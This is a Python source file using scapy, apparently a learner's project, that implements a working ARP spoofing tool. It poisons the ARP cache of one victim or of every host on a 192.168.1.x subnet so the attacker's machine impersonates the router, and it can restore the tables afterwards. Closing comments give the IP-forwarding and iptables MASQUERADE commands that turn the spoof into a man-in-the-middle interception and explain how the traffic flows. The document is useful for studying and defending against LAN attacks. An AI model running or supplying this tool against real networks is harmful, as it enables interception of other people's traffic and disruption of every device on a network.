import sys
import time
import argparse
from scapy.all import ARP, Ether, srp1, sendp, get_if_hwaddr, srp

iface = "wlp2s0"  # change if needed




def scan_active_hosts(subnet_prefix):
    #subnet netprecx is gonna be MOST LIKELY 192.168.1.
    #as it was cleverly made pre call

    active_hosts = []

    for i in range(2, 255):  
        #1 to 254 (skip .0 and .255) as range is exclusive of outer??

        ip = subnet_prefix + str(i)

        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        #create the frame and send it

        answered, _ = srp(packet, timeout=1, verbose=False)
        #talked through this logic before

        for _, rcv in answered:
            active_hosts.append((rcv.psrc, rcv[Ether].src))
            #and this logic talked before

    return active_hosts



def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    resp = srp1(pkt, timeout=0.5, iface=iface, verbose=False)
    return resp[Ether].src if resp else None
    #send ARP out asking to all whos IP this is and get their MAC

def restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac):
    print("[*] Restoring ARP tables...")
    #so my phone doesnt have to wait ages to restore its own tables
    #ofc assuming im not forwarding
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        psrc=spoofed_ip,
        hwsrc=spoofed_mac,
        pdst=target_ip,
        hwdst=target_mac
    )
    sendp(pkt, iface=iface, count=5, verbose=False)
    #sends my phone a packet saying what the routers IP and shit is



def spoof_all(spoofed_ip):

    subnet_prefix = "192.168.1."
    #set up the starting prefix

    spoofed_mac = get_mac(spoofed_ip)
    

    if not spoofed_mac:
        print(f"could not get MAC for spoofed IP: {spoofed_ip}")
        return

    print(f"spoofing all devices on subnet as {spoofed_ip}...")

    while True:
        try:
            for i in range(2, 255):  #skip .0 (network) and .1 (router itself)
                target_ip = subnet_prefix + str(i)
                #so each POSSIBLE device send a ping saying im the router
                if target_ip == spoofed_ip:
                    continue  
                #skip spoofing the router itself

                pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    psrc=spoofed_ip,
                    pdst=target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                sendp(pkt, iface=iface, verbose=False)
                #this is the ARP packet

            time.sleep(2)  
            #repeat every 2 seconds

        except KeyboardInterrupt:
            print("\nAll spoofing stopped. Restoring ARP tables...")
            for i in range(2, 255):
                target_ip = subnet_prefix + str(i)
                if target_ip == spoofed_ip:
                    continue  # skip restoring for the spoofed device itself
                target_mac = get_mac(target_ip)
                if target_mac:
                    restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)






def start_spoofer(spoofed_ip, target_ip):
    target_mac = get_mac(target_ip)
    spoofed_mac = get_mac(spoofed_ip)
    #get both MACs

    print("Target MAC:", target_mac)
    print("Spoofed MAC:", spoofed_mac)


    if not target_mac:
        print(f"[-] Could not get MAC for {target_ip}")
        sys.exit(1)

    print(f"[+] Spoofing {target_ip} as {spoofed_ip}")
    try:
        while True:
            pkt = Ether(dst=target_mac) / ARP(
                op=2,
                psrc=spoofed_ip,
                pdst=target_ip,
                hwdst=target_mac
            )
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(2)
        #CONTINUSOULY spam the victim with fake ARP replies (op = 2)
        #sayin "im the router"
        #around every 2 seconds app

    except KeyboardInterrupt:
        print("\n[+] Spoofing stopped.")
        restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)
        #stop it calls this with the args

#script run directly not imported
if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("spoofed_ip", nargs="?", help="IP router")
    parser.add_argument("target_ip", nargs="?", help="Victim IP (if not spoofing all)")
    parser.add_argument("--restore", action="store_true", help="Restore single")
    parser.add_argument("--all", action="store_true", help="Spoof all devices on subnet")
    parser.add_argument("--restore-all", action="store_true", help="Restore all devices on subnet")

    #adds the args
    #added more

    args = parser.parse_args()
    #gets them

    if args.restore:
        if not args.spoofed_ip or not args.target_ip:
            print("Usage: python3 spoofer.py --restore <spoofed_ip> <target_ip>")
            sys.exit(1)
        spoofed_mac = get_mac(args.spoofed_ip)
        target_mac = get_mac(args.target_ip)
        restore_arp(args.target_ip, target_mac, args.spoofed_ip, spoofed_mac)


    elif args.restore_all:
        if not args.spoofed_ip:
            print("Usage: python3 spoofer.py --restore-all <spoofed_ip>")
            #usage message on how to correctly do it
            sys.exit(1)
        spoofed_mac = get_mac(args.spoofed_ip)
        #get router MAC
        subnet_prefix = '.'.join(args.spoofed_ip.split('.')[:3]) + '.'
        #so uses . as the seperator therefore splits 1.1.1.1 into 192, 168, 1, 1
        #then grabs the first 3 so 192, 168, 1
        #then joins them with . again so now its 192.168.1
        #THEN puts a dot at the end so now its 192.168.1. like we want 

        active_hosts = scan_active_hosts(subnet_prefix)

        print(f"[+] Restoring {len(active_hosts)} devices...")
        for ip, mac in active_hosts:
            if ip == args.spoofed_ip:
                #so it doesnt send it to the router although ive already taken precaution with 2-254 not 1
                continue
            restore_arp(ip, mac, args.spoofed_ip, spoofed_mac)
            #then calls restore for EACH ip,mac combo


    elif args.all:
        if not args.spoofed_ip:
            print("Usage: python3 spoofer.py <spoofed_ip> --all")
            sys.exit(1)
        spoof_all(args.spoofed_ip)
        #self explanatory

    else:
        if not args.spoofed_ip or not args.target_ip:
            print("Usage: python3 spoofer.py <spoofed_ip> <target_ip>")
            sys.exit(1)
        start_spoofer(args.spoofed_ip, args.target_ip)
        #this is a single spoof



#sudo sysctl -w net.ipv4.ip_forward=1
#sudo iptables -t nat -A POSTROUTING -o wlp2s0 -j MASQUERADE
#for forwarding

#sudo sysctl -w net.ipv4.ip_forward=0



#so for example my phone wants to ping 8.8.8.8 -> sends packet to router 192.168.1.1
#BUT due to spoofing the MAC address for 192.168.1.1 points to my laptop (not the real router)

#therefore the packet still has a destination of 8.8.8.8 
#it arrives at my laptop because its impersonating the router at the MAC layer

#the forward command enables packet forwarding
#this allows my laptop to forward that packet out to the real router

#the packet is now on its way to 8.8.8.8 as normal (sent from my laptop)



#the iptables MASQUERADE rule rewrites the source IP of the packet before it leaves my laptop
#it replaces my phone's IP (e.g. 192.168.1.181) with my laptop's own IP 
#this makes the router think the request came from my laptop, not from my phone

#why? because if i didn't do this the router would try to reply directly to the phone
#but the phone thinks it's talking to the router (not the real one) so the return packet would skip us

#MASQUERADE ensures the router replies come back to us (the spoofing laptop)
#then we forward those replies back to the phone (again pretending to be the router)

